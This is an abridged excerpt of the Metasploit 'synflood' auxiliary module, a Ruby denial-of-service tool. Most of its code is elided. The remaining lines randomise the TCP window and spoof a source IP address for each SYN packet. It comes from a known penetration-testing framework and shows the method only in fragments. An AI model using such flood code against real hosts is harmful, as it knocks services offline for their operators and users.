##
# $Id: synflood.rb 14976 2012-03-18 05:08:13Z rapid7 $
##
...
class Metasploit3 < Msf::Auxiliary
	...
	def initialize
		super(
			...
			'License'     => MSF_LICENSE,
			'Version'     => '$Revision: 14976 $' # 03/13/2009
		)
	...
	def run
		...
		while (num <= 0) or (sent < num)
			...
			p.tcp_win = rand(4096)+1
                        ...
                        #for random source addresses from 10.0.0.0-10.255.255.255
                        #[rand(0x100000000)] all random
		        p.ip_saddr = [rand(0x0002FF)+0xA000000].pack('N').unpack('C*').join('.')
			p.tcp_sport = sport
